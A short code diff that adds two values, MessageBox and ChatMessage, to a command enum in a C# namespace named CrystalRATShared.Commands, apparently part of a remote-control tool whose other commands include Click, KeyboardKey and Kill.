@@ -16,6 +16,8 @@ namespace CrystalRATShared.Commands
         Click = 5,
         KeyboardKey = 6,
         Kill = 7,
+        MessageBox = 8,
+        ChatMessage = 9,
 
     }
 }
